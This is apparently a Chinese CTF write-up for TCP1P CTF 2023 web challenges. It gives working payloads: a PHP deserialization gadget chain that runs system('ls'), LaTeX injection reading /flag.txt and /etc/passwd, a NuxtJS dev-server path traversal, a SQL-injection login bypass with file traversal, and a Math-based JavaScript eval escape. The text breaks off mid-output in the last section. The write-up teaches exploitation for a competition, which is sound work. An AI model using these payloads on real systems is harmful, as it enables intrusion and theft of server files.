# 背景
TCP1P CTF 2023，举办时间为：**2023年10月14日-2023年10月15日**。
最近实在太忙，抽两小时打了一下，避免遗忘一些技能。

# WEB
## Un Secure


题目描述显然是一道反序列化题目，暗示我们需要进行RCE，并联系autoloader思考。

![在这里插入图片描述](https://img-blog.csdnimg.cn/9234521249b043e8a98640445856ace3.png)

目录结构如下：

![在这里插入图片描述](https://img-blog.csdnimg.cn/a5de5d70144c4cd4a54375f0d3b00b2c.png)

index.php只会简单打印信息，通过COOKIE进行反序列化。

![在这里插入图片描述](https://img-blog.csdnimg.cn/14a6571d1fae496c9f8fb5d37d0b2605.png)

在**GadgetThree\Vuln.php**中可以找到RCE的落脚点。

![在这里插入图片描述](https://img-blog.csdnimg.cn/8675be3435d641f580395d4198908de8.png)
我们一般不管是挖洞还是打CTF，其实本质都是要找到用户输入点与漏洞落脚点，并把他们联系起来，构建出一条漏洞利用链。
在实际的漏洞挖掘中这条链可能很复杂，但是在CTF场景下往往考察点单一简单，可以直接顺着思路构建。
因此我们后续重点可以开始考虑src下的几个Gadget文件以及vendor下的composer。

我们先看看另外两个Gadget文件：

![在这里插入图片描述](https://img-blog.csdnimg.cn/db76a504b74c439c90cf26f45fb81843.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/539d3c2248784ae1821b5a982173fdbe.png)

首先，让我们分析一下三个PHP文件中的代码：

 - GadgetOne\Adders：此类有一个私有属性 $x，并且有一个方法 get_x 可以返回该属性的值。
 - GadgetThree\Vuln：此类是一个存在安全漏洞的类。其 __toString 方法会执行 $this->cmd
   中的内容，但之前有三个WAF检查需要满足才会触发 eval 函数。
  
 - GadgetTwo\Echoers：当这个类的对象被销毁时，它会尝试调用   
   $this->klass->get_x()，显然我们可以将这个$this->klass指向 GadgetOne\Adders。   
   我们的目标是执行 eval 函数。要做到这一点，我们需要构建一个Gadget链，满足 GadgetThree\Vuln   
   类的三个WAF检查，并成功执行 $this->cmd。

Gadget链的构建：

首先，我们要构建一个 GadgetThree\Vuln 的对象，并设置其属性以满足WAF检查：

设置 $waf1 为 1。
设置 $waf2 为 "\xde\xad\xbe\xef"。
设置 $waf3 为 false。
设置 $cmd 为我们希望执行的命令。

我们需要确保 GadgetTwo\Echoers 的 __destruct 被调用，这样我们可以利用其输出 GadgetOne\Adders 中的 $x。

1、将 GadgetOne\Adders 的 $x 设置为一个新的 GadgetThree\Vuln 对象。
2、当 GadgetTwo\Echoers 被销毁，__destruct 方法会尝试输出 GadgetThree\Vuln 对象。这会触发 GadgetThree\Vuln 的 __toString 方法，如果满足三个WAF检查，eval 函数将执行我们的命令。

**这里就教大家一手干货。可以看到这几个类存在namespace和private/protected属性变量，在很多教程中都教大家手动构建序列化字符串，类似：**

```
$serializedVuln = 'O:15:"GadgetThree\Vuln":4:{s:4:"waf1";i:1;s:20:"' . "\0" . '*' . "\0" . 'waf2";s:4:"\xde\xad\xbe\xef";s:19:"' . "\0" . 'GadgetThree\Vuln' . "\0" . 'waf3";b:0;s:3:"cmd";s:19:"echo \'Hello, World!\';";}';

```
即拼接'\0'在两端来设置private属性，但事实上有**更简洁优美的写法**。看PHP官方文档你会发现更有趣的方法，参考下面的payload:

```php
<?php

require_once 'GadgetOne/Adders.php';
require_once 'GadgetThree/Vuln.php';
require_once 'GadgetTwo/Echoers.php';

use GadgetOne\Adders;
use GadgetThree\Vuln;
use GadgetTwo\Echoers;

$vuln = new Vuln();
$vuln->cmd = "echo 'Hello, World!';";
$vuln->waf1 = 1;

// 使用PHP的反射API来设置protected和private属性
$reflector = new ReflectionObject($vuln);
$waf2 = $reflector->getProperty('waf2');
$waf2->setAccessible(true);
$waf2->setValue($vuln, "\xde\xad\xbe\xef");

$waf3 = $reflector->getProperty('waf3');
$waf3->setAccessible(true);
$waf3->setValue($vuln, false);

$adders = new Adders($vuln);

$echoers = new Echoers();

// 使用PHP的反射API来设置protected属性
$reflector = new ReflectionObject($echoers);
$klass = $reflector->getProperty('klass');
$klass->setAccessible(true);
$klass->setValue($echoers, $adders);

// 删除对象以调用__destruct()
unset($echoers);
?>

```
我添加了注释，大家可以参考注释理解。这里我们执行的命令是echo 'Hello, World！'。

**我特地加unset只是方便新手理解destruct调用过程，实际上不用unset在运行结束后垃圾回收也会销毁这个类。**

运行看下效果：
![在这里插入图片描述](https://img-blog.csdnimg.cn/35c649218cdd4169a1091a2f6922c040.png)

事实上你如果了解过autoloader和php反序列化与加载特性，那你就会知道这道题已经解决了，基本功请自行搜索。

我们直接把上面的内容base64encode后，作为cookie参数传入，就可以直接执行命令。

完整payload：

```php
<?php

require_once 'GadgetOne/Adders.php';
require_once 'GadgetThree/Vuln.php';
require_once 'GadgetTwo/Echoers.php';

use GadgetOne\Adders;
use GadgetThree\Vuln;
use GadgetTwo\Echoers;

$vuln = new Vuln();
$vuln->cmd = "system('ls');";
$vuln->waf1 = 1;

// 使用PHP的反射API来设置protected和private属性
$reflector = new ReflectionObject($vuln);
$waf2 = $reflector->getProperty('waf2');
$waf2->setAccessible(true);
$waf2->setValue($vuln, "\xde\xad\xbe\xef");

$waf3 = $reflector->getProperty('waf3');
$waf3->setAccessible(true);
$waf3->setValue($vuln, false);

$adders = new Adders($vuln);

$echoers = new Echoers();

// 使用PHP的反射API来设置protected属性
$reflector = new ReflectionObject($echoers);
$klass = $reflector->getProperty('klass');
$klass->setAccessible(true);
$klass->setValue($echoers, $adders);

$payload = serialize($echoers);
$payloadBase64 = base64_encode($payload);

echo $payloadBase64;
?>

```
咱们直接ls,并作为cookie传过去：

![在这里插入图片描述](https://img-blog.csdnimg.cn/f38fc1cdac46422bb3388b918944ee8e.png)
执行成功，那么直接访问那个txt文件就行了。

flag：**TCP1P{unserialize in php go brrrrrrrr ouch}**

## Latex

还是先看基本信息：

![在这里插入图片描述](https://img-blog.csdnimg.cn/d712f033e0bd4c01bd8407e2606463de.png)

显然是一道Latex的题，有可能考nday，一般都是可以直接秒。

看一下基本结构：

![在这里插入图片描述](https://img-blog.csdnimg.cn/953edc131f8b459d9a6fed910e9a06b7.png)

一道go，比较有意思起来。

看**main.go**可以发现，就是接受你的参数并用gotex渲染，唯一的防护方式就是黑名单。

![在这里插入图片描述](https://img-blog.csdnimg.cn/46f8213157f942e880891548b210f34a.png)
看看黑名单：
![在这里插入图片描述](https://img-blog.csdnimg.cn/111a0f75151d454e9fdf357e908e3c22.png)
那你只要熟悉latex命令，这道题直接秒了。如果不熟悉，浪费的时间成本也只是搜索而已。

但搜索也是需要技巧的，这里想啰嗦一下。

如果你直接搜bypass，那大概率就是这样的文章：

[Latex Injection](https://exexute.github.io/2019/04/24/how-hacking-with-LaTex/)

写的很好，但这里直接把write给你禁了，你是否就不知道变通了呢？

这时候我们完全可以去看官方文档，不要怕麻烦：

[Latex Document](https://www.latex-project.org/help/documentation/#general-documentation)

你会发现官方文档才是最全的。。当然如果你Latex基本功很好，那就直接秒（基本功）：

```php
\documentclass{article}
\begin{document}
\catcode `\$=12
\catcode `\#=12
\catcode `\_=12
\catcode `\&=12
$\InputIfFileExists{/flag.txt}$
test
\end{document}
```
直接用\InputIfFileExists 不就绕过了。。类似函数还很多。

市面上的文章基本围绕：

```php
\input
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file
```
但实际上方法很多。研究安全要沉得下心。

**flag:**
![在这里插入图片描述](https://img-blog.csdnimg.cn/4f76435b2b7c413aabfa6be039b9ef84.png)
## love card
老规矩，看看目录结构：

![在这里插入图片描述](https://img-blog.csdnimg.cn/4d0383877349471297bc6436c213b7fc.png)

非常简单，那秘密应该就在index.php。

```php
<?php

ini_set("display_errors", 0);

foreach ($_GET as $key => $value) {
  ini_set($key, $value);
}

if ($_SERVER["REMOTE_ADDR"] == "127.0.0.1" && $_GET["dev"] == "true") {
  system($_GET["cmd"]);
}

if (preg_match('/<|>|\?|\*|\||&|;|\'|="/', $_GET["name"])) {
  error_log(
    "Warning: User tried to access with name: " .
      $_GET["name"] .
      ", Only alphanumeric allowed!"
  );
  die("Nope");
}
?>

<!DOCTYPE html>
<html>

<head>
  <title>Love Card</title>
  <style>
    body {
      background-color: #ffcad4;
      text-align: center;
      font-family: 'Arial', sans-serif;
    }

    .card {
      width: 350px;
      height: 420px;
      background-color: #fff;
      border-radius: 20px;
      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
      margin: 50px auto;
      padding: 30px;
    }

    h1 {
      color: #e63946;
      font-size: 28px;
      margin-bottom: 10px;
    }

    p {
      color: #333;
      font-size: 18px;
      line-height: 1.5;
      margin-bottom: 30px;
    }

    img {
      width: 100px;
      height: auto;
      border-radius: 10px;
    }

    .signature {
      font-size: 16px;
      margin-top: 20px;
    }
  </style>
</head>

<body>
  <div class="card">
    <h1>You Are Everything to Me</h1>
    <p>My love for you is boundless. With every beat of my heart, I cherish you more and more. You complete me in a way that cannot be put into words.</p>
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/42/Love_Heart_SVG.svg/968px-Love_Heart_SVG.svg.png?20081212064102" alt="Gambar Cinta">
    <p class="signature">Forever yours, <br> <?= isset($_GET["name"])
                                                    ? $_GET["name"]
                                                    : "[Your name]" ?></p>
  </div>
</body>

</html>
```

那这道题就太简单了。。没有分析的必要。

直接的system是个幌子，直接name那里RCE，然后用ini_set设置输出到一个php就行。

实际根本不会有这种情况，因此意义不大。具体操作略。

**flag:**
![在这里插入图片描述](https://img-blog.csdnimg.cn/713c99ef121745a6bde0f2eee0f85f42.png)
## A simple website

![在这里插入图片描述](https://img-blog.csdnimg.cn/160453a614494b6bbfa9a129c3f28977.png)

看上去是关于NuxtJS的，感觉可能有意思。

目录结构：

![在这里插入图片描述](https://img-blog.csdnimg.cn/f9e598c1cbd04f668df4377b5dab9a59.png)
app.vue:

```php
<template>
  <div class="landing-page">
    <header class="header">
      <nav class="navbar">
        <div class="logo">Cooking School</div>
        <ul class="nav-links">
          <li><a href="#">Home</a></li>
          <li><a href="#">Courses</a></li>
          <li><a href="#">About Us</a></li>
          <li><a href="#">Contact</a></li>
        </ul>
      </nav>
    </header>

    <section class="hero-section">
      <div class="hero-content">
        <h1>Welcome to Cooking School</h1>
        <p>Learn the art of cooking from our experienced chefs!</p>
        <a href="#" class="cta-button">Explore Courses</a>
      </div>
    </section>

    <section class="about-section">
      <div class="about-content">
        <h2>About Us</h2>
        <p>We are passionate about teaching the art of cooking to aspiring chefs...</p>
        <a href="#" class="cta-button">Learn More</a>
      </div>
    </section>

    <footer class="footer">
      <p>&copy; 2023 Cooking School. All rights reserved.</p>
    </footer>
  </div>
</template>

<style scoped>
/* Add your CSS styles here */
.landing-page {
  font-family: Arial, sans-serif;
}

.header {
  background-color: #fff;
  padding: 20px;
  box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.1);
}

.navbar {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.logo {
  font-size: 24px;
  font-weight: bold;
}

.nav-links {
  list-style: none;
  display: flex;
  gap: 20px;
}

.nav-links li a {
  text-decoration: none;
  color: #333;
  transition: color 0.3s;
}

.nav-links li a:hover {
  color: #f1592a;
}

.hero-section {
  background-image: url('/hero-bg.jpg');
  background-size: cover;
  color: #fff;
  padding: 100px 0;
  text-align: center;
}

.hero-content h1 {
  font-size: 36px;
  margin-bottom: 20px;
}

.cta-button {
  display: inline-block;
  background-color: #f1592a;
  color: #fff;
  padding: 10px 20px;
  border-radius: 5px;
  text-decoration: none;
  transition: background-color 0.3s;
}

.cta-button:hover {
  background-color: #d93b0a;
}

.about-section {
  background-color: #f9f9f9;
  padding: 80px 0;
  text-align: center;
}

.about-content h2 {
  font-size: 28px;
  margin-bottom: 20px;
}

.footer {
  background-color: #333;
  color: #fff;
  text-align: center;
  padding: 20px 0;
}
</style>

```

这道题如果对nuxtjs熟悉可以直接秒。

简单分析一下。主页面那么简单就知道是要打n day，直接看Dockerfile。

```php
# Use the official Node.js image as the base image
FROM node:18

# Install PNPM
RUN npm uninstall -g yarn pnpm
RUN npm install -g corepack

#RUN mkdir /.cache && chmod -R 777 node_modules/.cache

# Set the working directory in the container
WORKDIR /app

# Clone the Nuxt.js repository and switch to the desired release
RUN git clone https://github.com/nuxt/framework.git /app && \
    cd /app && \
    git checkout v3.0.0-rc.12

# Copy the test.txt file from the build context into the container
COPY flag.txt /

# Copy app.vue into container
COPY app.vue /app/playground/

# Install project dependencies using pnpm
RUN pnpm install
RUN pnpm build:stub

# Add new user named ctf and add permission for corepace
RUN useradd -ms /bin/bash ctf

RUN mkdir /home/ctf/.cache && chmod -R 777 /home/ctf/.cache && chmod -R 777 /app

# Change to user ctf
USER ctf

# Expose the port that Nuxt.js will run on
EXPOSE 3000

# Start the Nuxt.js development server
CMD ["pnpm", "run", "dev", "--host", "0.0.0.0"]

```

看到是开发者模式肯定很多人第一时间想到CVE-2023-3224吧？

但经验丰富的话你会发现，人家是nuxt/framework，根本不是一个东西。

这时候就考验漏洞储备了，不一定能搜到。我第一反应是dev模式的目录穿越，所以直接秒了。

payload：

```php
/_nuxt/@fs/flag.txt
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/05b057101e2d4bd991ae94cb7f097b87.png)

## Bypassssss
![在这里插入图片描述](https://img-blog.csdnimg.cn/2c5b5dc7b5314a19b6a73857fe71f53e.png)

这道题也非常简单。。。是一道php的sql注入，大家看看源码就知道咋回事了。。

```php
<?php
	session_start();

	include 'config.php';

	function sanitizeString($input) {
		$pattern = '/[\'"\(\)%=;\.\s-]/';
		$sanitized = preg_replace($pattern, '', $input);
		return $sanitized;
	}

	function removeBadStrings($input) {
		$badStrings = array(
        		'/UNION/i',
        		'/OR/i',
        		'/AND/i',
        		'/BY/i',
        		'/SELECT/i',
        		'/SLEEP/i',
				'/BENCHMARK/i',
        		'/TRUE/i',
        		'/FALSE/i',
				'/\d/'
			);
		$cleanedInput = preg_replace($badStrings, '', $input);
        return $cleanedInput;
	}

	$username = $_POST['username'];
	$password = $_POST['password'];

	$sanitizedUsername = sanitizeString($username);
	$sanitizedPassword = sanitizeString($password);

	$cleanUsername = removeBadStrings($sanitizedUsername);
	$cleanPassword = removeBadStrings($sanitizedPassword);

	$query = "SELECT * FROM admin WHERE username = '$cleanUsername' AND password = '$cleanPassword'";

	$data = mysqli_query($conn, $query);

	$cek = mysqli_num_rows($data);

	if ($cek > 0) {
		$_SESSION["admin_username"] = $sanitizedUsername;
		$_SESSION["admin_status"] = "true";
		header("Location: dashboard.php");
	} else {
		header("Location: index.php?msg=fail");
	}

?>

```

没啥好说的，payload如下：

```php
username=\
password=/**/oorr/**/`username`/**/like/**/`username`#
```
重在灵活，绕过其实很简单。

![在这里插入图片描述](https://img-blog.csdnimg.cn/b786eda503964484aff4a2841da6c40c.png)
直接成功登陆，按照上面的代码，此时我们$_SESSION["admin_status"] = "true" 。

接下来再看另一个文件：

```php
<?php
    session_start();

    if ($_SESSION["admin_status"] != "true") {
        header("Location: index.php?msg=login_first");
    }

    function sanitizeImagePath($imagePath) {
        $blacklist = array("./", "\\");

        $sanitizedPath = str_replace($blacklist, "", $imagePath);

        if (strpos($sanitizedPath, "images/") !== 0) {
            $sanitizedPath = "assets/img/" . $sanitizedPath;
        } else {
            echo "Invalid path";
        }

        return $sanitizedPath;
    }

    function displayImage($imagePath) {
        header("Content-Type: image/jpeg");
        readfile($imagePath);
    }

    if (isset($_GET['image'])) {
        $imagePath = $_GET['image'];
        $sanitizedImagePath = sanitizeImagePath($imagePath);
        displayImage($sanitizedImagePath);
    } else {
        echo "Image parameter not provided.";
    }
?>

```
无非多套了个娃，$_SESSION["admin_status"] = "true" 后这部分直接秒。

payload:

```php
/viewer.php?image=...//...//...//...//...//...//...//...//flag.txt
```
flag:

![在这里插入图片描述](https://img-blog.csdnimg.cn/28434f83ba0b4a859ea451f15fd1e444.png)
## Calculator

![在这里插入图片描述](https://img-blog.csdnimg.cn/61a558d15a844c13840dcc328b7524f3.png)

这道题就非常有意思了，虽然也不难，但是考察nodejs的功底，和一些构造payload的tricks。

建议看我的payload前自己想想怎么构造。

首先我们看题目结构：

![在这里插入图片描述](https://img-blog.csdnimg.cn/b93ae2646f564dbba406c5327cb7a06f.png)

我们需要关注的其实只有下面几个：

 - **main.js**: 控制路由
 - **module**：一些具体的代码模块。

让我们逐个来分析：

**main.js：**

```javascript
// @deno-types="npm:@types/express"
import express from "npm:express";
import Calculator from "./module/calculator.js"

const app = express()
app.use(express.json())

app.get("/", (_, res) => {
    return res.sendFile("index.html", { root: "." })
})

app.post("/", async (req, res) => {
    const calc = new Calculator()
    const expressions = req.body
    if (!(expressions instanceof Array)) {
        return res.status(400).send("expressions is not a list")
    }
    for (const exp of expressions) {
        calc.addExpression(exp)
    }
    let result = ""
    result = await calc.calculate().catch((e) => { console.error(e); return "something wrong" })
    return res.status(200).send(result.toString())
})

if (import.meta.main) {
    app.listen(8080, "0.0.0.0", () => {
        console.log("listening @ http://0.0.0.0:8080")
    })
}

```
直接锁定POST路由，看到传入的格式是Array，同时会调用calc的addExpression与calc.calculate，最后将result返回。

我们来看看module下面的几个文件。

**calculator.js:**

```javascript
import { f } from "./isolation.js"

class Calculator {
    REGEX_EXPRESSION = /^Math\.[a-zA-Z0-9\._]+$/
    expressions = []

    constructor() {
        this.expressions = []
    }

    addExpression(expression) {
        if (!this.REGEX_EXPRESSION.test(expression)) {
            return false
        }
        this.expressions.push(expression)
        return true
    }

    async calculate() {
        if (this.expressions.length == 0) {
            return "Nothing to calculate"
        }
        let result = ""
        for (const operation of this.expressions) {
            result = `${operation}(${result})`
        }
        return await f(result)
    }
}

export default Calculator

```

**extendedMath.js:**

```javascript

class ExtendedMath {
    newMath = Math
    constructor() {
        this.newMath.seeds = [0.1, 0.2, 0.3, 0.4, 0.5];
        this.newMath.next = Math.seeds[new Date().getTime() % Math.seeds.length];
        this.newMath.random = function () {
            this.next = this.next * 3 + 1234;
            return (this.next / 65536) % 32767;
        };
    }
}
export default ExtendedMath;


```

**isolation.js:**

```javascript
export function f(code) {
    return new Promise((resolve, reject) => {
        const worker = new Worker(new URL("./worker.js", import.meta.url).href, {
            type: "module",
            deno: {
                permissions: {
                    read: true
                }
            }
        });
        worker.onmessage = (ev) => {
            if (ev.data.message){
                resolve(ev.data.message)
            }else {
                reject(ev.data.error)
            }
        }
        worker.postMessage(code)
    })
}

```

**worker.js:**

```javascript
import ExtendedMath from "./extendedMath.js"
function mathEval(code) {
    return new Promise((resolve, reject) => {
        try {
            const f = Function("return " + code)
            resolve(f.apply({ Math: (new ExtendedMath()).newMath }))
        } catch (error) {
            reject(error)
        }
    })

}
self.onmessage = (ev) => {
    mathEval(ev.data)
        .then(message => self.postMessage({ message }))
        .catch(error => self.postMessage({ error }))
}

```
建议到这里大家停一下，理清楚代码结构，并想想怎么去构造攻击payload。

我们一起梳理一下：

路由传入表达式，类似于：

![在这里插入图片描述](https://img-blog.csdnimg.cn/f76e4b8575e8454da69db44e1c5cd2c5.png)

这个exp会被传入calc.addExpression：

```javascript
for (const exp of expressions) {
        calc.addExpression(exp)
    }
```
addExpression函数在**calculator.js中：**

```javascript
addExpression(expression) {
        if (!this.REGEX_EXPRESSION.test(expression)) {
            return false
        }
        this.expressions.push(expression)
        return true
    }
```
相当于只要你传入的每个元素经过了正则的检查，就会被push到新数组expression中。

正则检查也在这个文件中：

```javascript
REGEX_EXPRESSION = /^Math\.[a-zA-Z0-9\._]+$/
```

即Math.开头，后面任意匹配大小写字母、数字、.、下划线。

然后就会被放入calculate进行处理了。

```javascript
async calculate() {
        if (this.expressions.length == 0) {
            return "Nothing to calculate"
        }
        let result = ""
        for (const operation of this.expressions) {
            result = `${operation}(${result})`
        }
        return await f(result)
    }
```
**result = Math.ceil(Math.random())**

这里观察一下result = `${operation}(${result})`就会知道为什么最内层的random会有个()，所以传入Math.PI之类的常数是会直接error的。

我们继续跟进f函数，在**isolation.js**里面：

```javascript
export function f(code) {
    return new Promise((resolve, reject) => {
        const worker = new Worker(new URL("./worker.js", import.meta.url).href, {
            type: "module",
            deno: {
                permissions: {
                    read: true
                }
            }
        });
        worker.onmessage = (ev) => {
            if (ev.data.message){
                resolve(ev.data.message)
            }else {
                reject(ev.data.error)
            }
        }
        worker.postMessage(code)
    })
}

```

这里尝试用worker安全地处理代码，所以核心逻辑我们再跟进**worker.js**：

```javascript
import ExtendedMath from "./extendedMath.js"
function mathEval(code) {
    return new Promise((resolve, reject) => {
        try {
            const f = Function("return " + code)
            resolve(f.apply({ Math: (new ExtendedMath()).newMath }))
        } catch (error) {
            reject(error)
        }
    })

}
self.onmessage = (ev) => {
    mathEval(ev.data)
        .then(message => self.postMessage({ message }))
        .catch(error => self.postMessage({ error }))
}

```

那到这里就捋清楚了。

```javascript
const f = Function("return " + code)
resolve(f.apply({ Math: (new ExtendedMath()).newMath }))
```

这里直接用Function拼接了我们输入的内容，code是之前的result。

Math这个类是JS内置的，但这里用ExtendedMath做了继承：

```javascript

class ExtendedMath {
    newMath = Math
    constructor() {
        this.newMath.seeds = [0.1, 0.2, 0.3, 0.4, 0.5];
        this.newMath.next = Math.seeds[new Date().getTime() % Math.seeds.length];
        this.newMath.random = function () {
            this.next = this.next * 3 + 1234;
            return (this.next / 65536) % 32767;
        };
    }
}
export default ExtendedMath;


```

所以上面的测试就应该是"return Math.ceil(Math.random())",返回的结果应该是1。我们测试一下：

![在这里插入图片描述](https://img-blog.csdnimg.cn/110b46cdc1854b0da46f79336f80d3d3.png)
好的，那真正有趣的事情从现在开始。我们应该怎么去构造payload实现任意代码执行？

具体来讲，是怎么用Math去构造？

一般讲到NodeJs，第一反应都是原型链污染。很多人看到没过滤_，下意识就是Math.__proto__或者Math.prototype之类的payload去构造。

但问题是怎么构造出来RCE？

大家看到这可以尽情尝试一番。

分享一下我的思路，这道题简单但有趣，我用的是JS的一些特性去构造字符。因为我们的漏洞落地点就是直接的Function来拼接我们的内容，我们并不需要去用Math的原型链或者constructor拿到Object Function，即使拿到，我们也无法传入参数。

没错，这个地方还有个challenge是参数控制。它是自带逻辑嵌套你输入的数组里的每个元素，外层的参数只能来自于前面的结果，这限制了我们的发挥。

我们一步步来。

### 用Math构造出任意数字

我们先构造数字，这是最简单的。

我们当然可以用Math的计算去构造，这也是直观想法，难道构造个数字还不简单？

但我们想构造出定向的任意数字，还有更好的方法，用Math的函数计算不是那么可控。

我的思路是这样：

```javascript
Math.sin.name.length.valueOf()
```
我们来看看效果：
![在这里插入图片描述](https://img-blog.csdnimg.cn/7678ba7ba1e0423d8533fb944d8cc387.png)

没错，我直接调用name,得到String，然后再调用length得到长度，再用valueOf转为数字。

一套下来就得到任意的数字了，当然大一些的数字还是要结合Math的函数构造。

### 用Math构造出任意字母

这是比较关键的。如果我能构造任意字母，控制最终返回的return后面的内容，那目的就达成了。

我的思路：

对于数字类型的字母，即3我们想得到'3'，可以用：

```javascript
Math.sin.name.length.toString()
```
![!\[在这里插入图片](https://img-blog.csdnimg.cn/d38cf367980e45fd86668945dcdb6cc7.png)
就是不用那么麻烦，再转int就行。

当然也可以直接用构造器，这里有个小trick:

![在这里插入图片描述](https://img-blog.csdnimg.cn/cd43d0c7f9b84bac9e0edc9cd97ac510.png)

name是String，直接用constructor就行。

那么类似于'a'、'A'之类的字符呢？大家最熟悉的String.fromCharCode就行，我们已经得到String了。

![在这里插入图片描述](https://img-blog.csdnimg.cn/f78ceaf1d6d34c26bc285bb2a265cc82.png)
都可以，大家自己选。

### 将构造出来的字母拼接成payload


现在我们已经解决了构造字母的问题，但这样的链式包裹处理方式，让我们不禁思考，怎么把得到的单个字符拼起来？

这是最有趣的问题。

我的想法是，既然有多个元素，那么我们如果可以把他们依照顺序组织成数组结果，类似['a','b','s']，再拼起来，不就行了吗？

我们看ExtendedMath:

```javascript

class ExtendedMath {
    newMath = Math
    constructor() {
        this.newMath.seeds = [0.1, 0.2, 0.3, 0.4, 0.5];
        this.newMath.next = Math.seeds[new Date().getTime() % Math.seeds.length];
        this.newMath.random = function () {
            this.next = this.next * 3 + 1234;
            return (this.next / 65536) % 32767;
        };
    }
}
export default ExtendedMath;


```

这正好有个数组结构的玩意，我们完全可以利用。这就是出题人留的一线生机。（当然没有也可以构造，怎么构造我不说）

![在这里插入图片描述](https://img-blog.csdnimg.cn/d11007796f9a4cf09d115fef0d80a443.png)

我们来找找seeds能够用到的函数，会发现有个join。

![在这里插入图片描述](https://img-blog.csdnimg.cn/1a7cd7c30f684b208f80a647632c1ebc.png)
大家能注意区别吧？直接调用join就可以拼起来，但是我们的链式结果注定必须要传参。

那到这里应该怎么做呢？

可以这么玩花活：

首先找到一个传参不影响函数输出结果的，例如 **Math.abs.name.toLowerCase**。

我们前面的输入就可以被忽略了，因为**Math.abs.name.toLowerCase**在后面殿后，那么不管前面是什么值，都不会影响到后面。

我们再用Math.seeds.join包裹Math.abs.name.toLowerCase，不就最大化无损了？

![在这里插入图片描述](https://img-blog.csdnimg.cn/5bbe992250fc411589c47b250b2cfeb7.png)

看到这先别懵。**实际上我们前面的项的结果并不重要，我们是为了改变seeds的内容。** 所以这么构造只是为了保障整体不会error挂掉，后面才是核心环节。

ok，让我们来梳理一下，梳理了就不蒙了。

### 构造payload

我们前面先输入Math.seeds.pop五次。

["Math.seeds.pop", "Math.seeds.pop", "Math.seeds.pop", "Math.seeds.pop", "Math.seeds.pop"]

构造出一堆字母表达对应的式子，类似'a'可能对应['Math.xxxx', 'Math.xxx',.....]，记作A。

随后我们用Math.seeds.push跟上A，得到：

["Math.seeds.pop", "Math.seeds.pop", "Math.seeds.pop", "Math.seeds.pop", "Math.seeds.pop", A1, "Math.seeds.push", A2,  "Math.seeds.push", ...]

当然A1/A2...是可以展开的。

那么到这里就用我们上面的策略去处理前面的输出，反正Math.seeds已经被我们改变了。

["Math.seeds.pop", "Math.seeds.pop", "Math.seeds.pop", "Math.seeds.pop", "Math.seeds.pop", A1, "Math.seeds.push", A2,  "Math.seeds.push", ..., "Math.abs.name.toLowerCase"]

接下来开始直接join Math.seeds,得到用abs分隔的数组内部元素：

["Math.seeds.pop", "Math.seeds.pop", "Math.seeds.pop", "Math.seeds.pop", "Math.seeds.pop", A1, "Math.seeds.push", A2,  "Math.seeds.push", ..., "Math.abs.name.toLowerCase", "Math.seeds.join"]

假设我们构造的目标是"flag"，此时就应该得到"**f**abs**l**abs**a**abs**g**"。

用下面的payload试一下：

**f**

我写的啰嗦一点哈~有基础的朋友跳过。

f是102，用数学计算构造一下。

![在这里插入图片描述](https://img-blog.csdnimg.cn/a1ec92cd9bdf4b7c97e51bfa01d87723.png)

挺好构造的，那么71是：

![在这里插入图片描述](https://img-blog.csdnimg.cn/c32cd19f93eb44c9afaab4e2578dd3b4.png)

49是：

![在这里插入图片描述](https://img-blog.csdnimg.cn/66440713519e4089a6d76160939819b1.png)

34是：

![在这里插入图片描述](https://img-blog.csdnimg.cn/0bb3c9a5eef54e178c06b3e8bbf36b5f.png)

24是：

![在这里插入图片描述](https://img-blog.csdnimg.cn/ec8e9d5cb01344afba386e294d894e46.png)

17是：

![在这里插入图片描述](https://img-blog.csdnimg.cn/401e9eb4153e46b6966b5067b2e11891.png)

12是：

![在这里插入图片描述](https://img-blog.csdnimg.cn/5beb90ed44894ee6896305c7a0bb643b.png)

9是：

![在这里插入图片描述](https://img-blog.csdnimg.cn/d7c21ce02ed74cd591c7b9f4acb74d8a.png)

6就不用构造了，直接用我们前面说的name拿：

![在这里插入图片描述](https://img-blog.csdnimg.cn/606790dc1ec644cc9364b7f1c6c988bb.png)

套起来就行。

这里只演示一个字母，其余字母是一样的。

而且这种套娃的实在太容易写脚本搞了吧。我们直接写脚本：

```python
import math
import re
import string


def convert_the_target_num(target, res):
    if target < 7:
        return target
    for i in range(target):
        if math.floor(math.log2(math.exp(i))) == target:
            # print(i)
            res.append(f'Math.floor(Math.log2(Math.exp({i})))')
            convert_the_target_num(i, res)
            break
        elif math.ceil(math.log2(math.exp(i))) == target:
            # print(i)
            res.append(f'Math.ceil(Math.log2(Math.exp({i})))')
            convert_the_target_num(i, res)
            break

    return res


def convert_to_js(res):
    res.reverse()
    js_res = ''

    for i in range(len(res)):
        if i ==0:
            js_res = res[i]
            continue
        pattern = r"Math\.exp\((\d+)\)"
        match = re.search(pattern, res[i])
        if match:
            extracted_number = match.group(1)
            print(res[i])
            js_res = res[i].replace(extracted_number, js_res)
            print(js_res)
    return js_res

a = []
res = convert_the_target_num(128, a)
print(res)

print(convert_to_js(res))

```
最后的结果大家可以直接用JS运行：

![在这里插入图片描述](https://img-blog.csdnimg.cn/f24b36a4532247f2b56a402c041402c2.png)

```python
['Math.floor(Math.log2(Math.exp(71)))', 'Math.ceil(Math.log2(Math.exp(49)))', 'Math.floor(Math.log2(Math.exp(34)))', 'Math.ceil(Math.log2(Math.exp(23)))', 'Math.floor(Math.log2(Math.exp(16)))', 'Math.ceil(Math.log2(Math.exp(11)))', 'Math.ceil(Math.log2(Math.exp(7)))', 'Math.floor(Math.log2(Math.exp(5)))']
Math.ceil(Math.log2(Math.exp(7)))
Math.ceil(Math.log2(Math.exp(Math.floor(Math.log2(Math.exp(5))))))
Math.ceil(Math.log2(Math.exp(11)))
Math.ceil(Math.log2(Math.exp(Math.ceil(Math.log2(Math.exp(Math.floor(Math.log2(Math.exp(5)))))))))
Math.floor(Math.log2(Math.exp(16)))
Math.floor(Math.log2(Math.exp(Math.ceil(Math.log2(Math.exp(Math.ceil(Math.log2(Math.exp(Math.floor(Math.log2(Math.exp(5))))))))))))
Math.ceil(Math.log2(Math.exp(23)))
